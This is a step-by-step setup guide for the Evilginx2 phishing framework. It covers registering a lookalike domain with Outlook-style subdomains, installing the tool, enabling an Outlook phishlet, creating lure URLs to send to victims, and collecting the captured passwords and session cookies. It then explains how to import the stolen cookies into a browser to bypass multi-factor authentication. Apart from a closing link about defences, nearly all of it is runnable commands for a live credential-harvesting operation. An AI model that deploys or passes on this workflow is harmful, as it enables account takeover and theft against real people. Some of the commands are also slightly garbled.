# Evilginx Setup Guide

EvilGinx is a man-in-the-middle attack framework designed to capture credentials and session cookies from users interacting with phishing sites. This tool can be used for penetration testing and security assessments, allowing security professionals to simulate phishing attacks and understand the techniques attackers might employ.
Official Documentation can be found [here](https://help.evilginx.com/docs/intro)

## Usage

**IMPORTANT!** Make sure that there is no service listening on ports `TCP 443`, `TCP 80` and `UDP 53`. You may need to shut down Apache or Nginx and any service used for resolving DNS that may be running. **evilginx2** will notify you on launch if it fails to open a listening socket on any of these ports.

By default, **evilginx2** will look for phishlets in `./phishlets/` directory and later in `/usr/share/evilginx/phishlets/`. To specify a custom path for phishlets, use the `-p <phishlets_dir_path>` parameter when launching the tool.

By default, **evilginx2** will look for HTML templates in `./templates/` directory and later in `/usr/share/evilginx/templates/`. To specify a custom path for HTML templates, use the `-t <templates_dir_path>` parameter when launching the tool.

More Tips and Tricks can be found [here](https://github.com/An0nUD4Y/Evilginx2-Phishlets)

### Infrastructure setup 

Buy a domain(NameCheap has cheap domains). Transfer domain to your VPC provider. Create "A" record. 

### NameCheap domain transfer
>>>

### DigitalOcean DNS Records
>>>
### DNS Records

Configure your DNS records as follows:
```
A    account.identity-access.online  
A    *.identity-access.online  
A    outlook.identity-access.online  
A    www.identity-access.online  
A    live.identity-access.online  
A    identity-access.online  
```

#### Installing from source

```
sudo apt-get -y install git make
git clone https://github.com/hash3liZer/evilginx2.git
cd evilginx2
make
```

You can now either run **evilginx2** from local directory like:
```
sudo ./evilginx2
```
or install it globally:
```
sudo make install
sudo evilginx
```

## Installing with Docker

```bash
docker build . -t evilginx2
```
```bash
docker run -it -p 53:53/udp -p 80:80 -p 443:443 evilginx2
```

Phishlets are loaded within the container at `/app/phishlets`, which can be mounted as a volume for configuration.


## Evilginx Commands to Get Started

Set up your server's domain and IP using the following commands:
```bash
config ipv4 external <publicIP>
config domain <yourdomain.com(ex:identity-access.online)>
```

Set up the phishlet you want to use.
```bash
phishlets hostname outlook <yourdomain.com(ex:identity-access.online)>
```

You can now `enable` the phishlet, which will initiate the automatic retrieval of Let's Encrypt SSL/TLS certificates if none are locally found for the hostname you picked:
```bash
phishlets enable outlook
```

Block unauthorized bots/scanners:
```bash
blacklist unauth
```

Your phishing site is now live. Think of the URL where you want the victim to be redirected upon successful login, and get the phishing URL like this (the victim will be redirected to `https://www.google.com`):
```bash
lures create linkedin
lures edit 0 redirect_url https://www.google.com
lures get-url 0
```

Running phishlets will only respond to phishing links generated for specific lures, so any scanners that scan your main domain will be redirected to the URL specified as `redirect_url` under `config`. If you want to hide your phishlet and make it not respond even to valid lure phishing URLs, use `phishlet hide/unhide <phishlet>` command.

You can monitor captured credentials and session cookies with:
```bash
sessions
```

To get detailed information about the captured session, with the session cookie itself (it will be printed in JSON format at the bottom), select its session ID:
```bash
sessions <id>
```

The captured session cookie can be copied and imported into the Chrome browser using the [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en) extension.

**Important!** If you want **evilginx2** to continue running after you log out from your server, you should run it inside a `screen` or `tmux` session.

### Alternative Installation Steps

```bash
apt-get update
apt-get upgrade -y
sudo apt install git golang-go -y
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
go build
cd phishlets
git clone https://github.com/ArchonLabs/evilginx2-phishlets.git
cd evilginx2-phishlets/phishlets
mv ./* ../../
cd ../../
./evilginx2
config ipv4 external <publicIP>
config domain identity-access.online
phishlets hostname outlook identity-access.online
phishlets enable outlook
blacklist unauth
lures create outlook 
lures 
lures get-url 0
```

## Local Testing 
Start Evilginx with -developer command-line argument and it will switch itself into developer mode.
In this mode, instead of trying to obtain LetsEncrypt SSL/TLS certificates, it will automatically generate self-signed certificates.
Evilginx will generate a new root CA certificate when it runs for the first time. You can find the CA certificate at $HOME/.evilginx/ca.crt or %USERPROFILE%\.evilginx\ca.crt. Import this certificate into your certificate storage as a trusted root CA and your browsers will trust every certificate, generated by Evilginx.
Since this feature allows for local development, there is no need to register a domain at domain registrars. Just use any domain you want and set the server IP to 127.0.0.1 or your LAN IP:
    ```bash
config domain anydomainyouwant.com
config ip 127.0.0.1
    ```
It is important that your computer redirects all connections to phishing sites, to your local IP address. In order to do that, you need to modify the hosts file.
First, generate the hosts redirect rules with Evilginx, for the phishlet you want:
: phishlets hostname twitter twitter.anydomainyouwant.com
: phishlets get-hosts twitter
    ```bash
127.0.0.1 twitter.anydomainyouwant.com
127.0.0.1 abs.twitter.anydomainyouwant.com
127.0.0.1 api.twitter.anydomainyouwant.com
    ```
Copy the command output and paste it into your hosts file. The hosts file can be found at:
Linux: /etc/hosts
Windows: %WINDIR%\System32\drivers\etc\hosts
Remember to enable your phishlet and you can start using Evilginx locally (can be useful for demos too!).

```bash
    # create self-signed cert
    openssl req -x509 -newkey rsa:2048 -keyout *.identity-access.online -out *.identity-access.online.crt -days 365 -nodes
    mv *.identity-access.online.crt /phishlets
    mv *.identity-access.online.crt /phishlets
    
    ./evilginx -developer
    config autocert off
    test-certs
```

### Protecting Against Phishing Attacks

To learn how web developers can protect against MFA phishing attacks and the use of Evilginx, watch this video: [How Web Developers Can Protect Websites](https://www.youtube.com/watch?v=C-Fh4sIdY8c).

### Creating Phishlets

For guidance on creating phishlets for MFA bypass, refer to this resource: [Creating Phishlets](https://research.aurainfosec.io/pentest/hook-line-and-phishlet/).


